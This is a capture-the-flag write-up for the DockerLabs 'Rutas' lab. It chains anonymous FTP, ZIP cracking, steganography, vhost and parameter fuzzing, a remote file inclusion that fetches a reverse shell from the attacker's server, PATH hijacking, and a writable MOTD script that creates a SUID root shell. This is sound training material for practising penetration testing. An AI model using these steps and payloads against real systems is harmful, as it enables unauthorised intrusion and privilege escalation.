---
type: machine
platform: dockerlabs
difficulty: intermediate
ip: 172.17.0.2
cves: []
tools: [nmap, ftp, john-the-ripper, wget, steghide, gobuster, ffuf, curl, ssh]
techniques: [information-gathering, ftp-anonymous-login, zip-cracking, steganography, directory-fuzzing, virtual-hosting, source-code-disclosure, parameter-fuzzing, remote-file-inclusion, reverse-shells, sudo-abuse, path-hijacking, hardcoded-credentials, writable-motd]
tags: [ejpt:assessment, ejpt:web-pentest, ejpt:host-net-pentest]
related: ["[[steganography]]", "[[remote-file-inclusion]]", "[[writable-motd]]", "[[path-hijacking]]"]
---

# Rutas

**Writeup:** [raw writeup](../../writeups/dockerlabs/intermediate/rutas.md)

A chain box where **every stage hands you the key to the next**: anonymous FTP → cracked ZIP → hint → steganography → HTTP Basic-auth credential → hidden vhost → fuzzed parameter → RFI shell → three lateral hops (www-data → norberto → maria) → writable MOTD → root. The default Apache page is a decoy; the real app only exists for a hostname you learn from a *picture*.

```
Kali (172.17.0.1) ─ 172.17.0.0/16 ─ rutas (172.17.0.2)
```

## Path

1. **Recon** — `ping -c 2` (ttl=64) then `sudo nmap -p- --open -sS --min-rate 5000 -n -Pn` → `21/22/80`; `-sCV` → vsftpd 3.0.5 with **anonymous login allowed** (files `hola_disfruta` 0 B + `respeta.zip` 293 B), OpenSSH 7.7p1 Ubuntu, Apache 2.4.58 serving the **"It works" default page** ([[information-gathering]], [[nmap]]).
2. **FTP** — `ftp` → `prompt off` → `mget *` pulls both files; `hola_disfruta` is empty (its *name* is the hint: "enjoy"), `respeta.zip` is password-protected ([[ftp-anonymous-login]], [[ftp]]).
3. **ZIP** — `zip2john respeta.zip > hash.txt` → `john` → **`greenday`** → `oculto.txt` inside: *"Consigue la imagen crackpass.jpg — firstatack.github.io — sin fuzzing con logica y observando la sacaras, muy rapido"* ([[zip-cracking]], [[john-the-ripper]]).
4. **Stego** — `wget https://firstatack.github.io/assets/crackpass.jpg` (the carrier lives on the **author's site**, not the box) → `steghide extract -sf crackpass.jpg` → `passwd.zip` → `pass` → **`hackeada:denuevo`** ([[steganography]], [[wget]], [[steghide]]).
5. **Web** — `gobuster dir` on the IP → `index.html` (the default page), `index.php`, `server-status` (403). `index.php` carries two HTML comments — *"Tuvimos problemas seguridad y hemos aplicado unos pocos cambios, no obstante nos han vuelto a romper"* and *"este web developer no vale un pingo lo hace todo muy obvio"* — plus an `<aside>` with three links: `vulndb.com`, **`trackedvuln.dl/`**, `dockerlabs.es` ([[directory-fuzzing]], [[source-code-disclosure]]).
6. **Vhost** — map it in `/etc/hosts` and re-fuzz **with credentials**: `gobuster … -H "Authorization: Basic $(echo -n 'hackeada:denuevo' | base64)" --xl 461`. Note the size delta — `index.php` is **1116 unauthenticated → 901 authenticated**, so the credential really changed the response ([[virtual-hosting]], [[hardcoded-credentials]]).
7. **Parameter** — `ffuf -u http://trackedvuln.dl/index.php?FUZZ=test … -fs 901` → **`love`** (size 1079). A path-wordlist fuzz (`LFI-Jhaddix.txt`) through the same parameter returns *nothing* — the sink wants a URL, not a path ([[parameter-fuzzing]]).
8. **RFI → shell** — `?love=http://172.17.0.1:8000` reaches Kali's server (server-side fetch), then `?love=http://172.17.0.1:8000/revshell.php` comes back as **`www-data`** ([[remote-file-inclusion]], [[reverse-shells]]).
9. **www-data → norberto** — `sudo -l` → `(norberto) NOPASSWD: /usr/bin/baner`. The binary runs `head` **twice**: with an absolute path (safe) and with a bare name (the hook) → `export PATH=/tmp:$PATH`, `echo '/bin/bash' > /tmp/head`, `chmod +x /tmp/head`, `sudo -u norberto /usr/bin/baner` → shell as norberto ([[sudo-abuse]], [[path-hijacking]]).
10. **norberto** — `cat /home/norberto/.-/.miscredenciales` ends with a Braille line → decode → **`practicacreandoretos`** → `ssh norberto@172.17.0.2` (the hijack shell is disposable; log in properly with it) ([[steganography]], [[ssh]]).
11. **→ maria** — `cat /home/maria/.mipass` → `maria:asientiendesmejor` → `su maria` ([[hardcoded-credentials]]).
12. **→ root** — `find / -writable 2>/dev/null | grep -v /proc/` → **`/etc/update-motd.d/00-header`**, which root runs on every SSH login → append `cp /bin/bash /tmp/bash` + `chmod 4755 /tmp/bash` → reconnect → `/tmp/bash -p` → **root** ([[writable-motd]]).

## Credentials

| Stage | Credential | Source |
|-------|-----------|--------|
| ZIP | `greenday` | `zip2john` + `john` on `respeta.zip` |
| Basic auth (vhost) | `hackeada:denuevo` | `steghide` → `passwd.zip` → `pass` |
| SSH / sudo `norberto` | `practicacreandoretos` | Braille in `~norberto/.-/.miscredenciales` |
| `su maria` | `asientiendesmejor` | `/home/maria/.mipass` |

## Takeaways

- **Follow the chain, don't branch.** The box gives you one artifact per stage — ZIP → hint → image → credential → hostname → parameter. Nothing here was found by spraying rockyou at it; each key was *manufactured* by the previous step.
- **An empty file can be the hint.** `hola_disfruta` was 0 bytes and still carried meaning; the ZIP's *name* (`respeta` = "respect") and the comment *"no obstante nos han vuelto a romper"* are the same genre. Read names, not just contents ([[ftp-anonymous-login]]).
- **The default page is not the site.** Apache "It works" + three links in an `<aside>` = a vhost you reach through `/etc/hosts`. And the credential that unlocks it came from an image fetched off the **author's** domain ([[virtual-hosting]], [[steganography]]).
- **Calibrate filters on both sides of an auth boundary.** `--xl 461` (gobuster) and `-fs 901,1079` (ffuf) only work because you compared the *same* URL authenticated vs not (1116 → 901). The delta is information — record it before you filter it away ([[directory-fuzzing]], [[parameter-fuzzing]]).
- **Probe the shape of the input before you fuzz it.** `LFI-Jhaddix.txt` found nothing because the sink takes `scheme://…`, not `../`. A silent fuzz result means *wrong vocabulary*, not *no bug* ([[remote-file-inclusion]]).
- **SSRF vs RFI is decided by what you can make it do.** `http://172.17.0.1:8000` only proved the fetch; `…/revshell.php` coming back as `www-data` proved the fetched content *ran*. Ask which one you have **before** you pick a payload.
- **`sudo -l` output can point at the payload.** `baner` literally printed `Ejecutando 'head' con ruta relativa` — the binary told you it resolves `head` through `PATH`. Custom binaries that print their own logic are a gift ([[path-hijacking]]).
- **A hijack shell is a tool, not a session.** Use it to read the credential, then `ssh` in properly — the next steps need a login that survives ([[ssh]]).
- **`find -writable` beats `find -perm -4000` on a box you've been given a shell on.** The privesc here isn't a SUID binary or sudo: it's a script the *system* runs as root at a moment **you** control (login) ([[writable-motd]], [[cron-job-abuse]]).

## Gaps in the writeup

- **Steghide passphrase never recorded** — the prompt appears with no answer. It's the obvious reuse candidate (`greenday`, or a hint string), but that's an assumption: on a re-run, write down what you typed ([[steganography]]).
- **`whoami` prints `maria` *before* `su maria` appears** in the SSH block — the paste order can't be literal (you can't be maria before escalating to her). The chain above assumes SSH-as-norberto → read `.mipass` → `su maria`; confirm on a re-run.
- **Why `trackedvuln.dl` and not the other two links** isn't explained — `vulndb.com` and `dockerlabs.es` were never mapped. The box's own hint (*"sin fuzzing con logica y observando"*) says the choice should be observable; the observation that picks `trackedvuln.dl` is missing.
